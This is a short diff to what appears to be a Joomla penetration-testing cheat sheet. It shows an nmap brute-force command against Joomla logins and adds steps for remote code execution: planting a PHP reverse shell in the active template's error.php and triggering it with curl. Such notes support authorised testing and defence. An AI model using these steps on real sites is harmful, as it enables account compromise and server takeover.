@@ -33,3 +33,17 @@ Modify the specific line:
 Run the attack
 
     nmap -sV --script http-joomla-brute --script-args 'userdb=users.txt,passdb=wordlist.txt' IP
+
+## Admin Panel RCE (Requires Credentials)
+
+### 1) Template modification
+
+Go to:
+
+    System -> Extensions -> Site templates -> templates
+
+Find the active template of the site, then edit the error.php file with a PHP reverse shell
+
+Trigger the shell
+
+    curl -k "http://DOMAIN.LOCAL/templates/TEMPLATE_NAME/error.php/error"
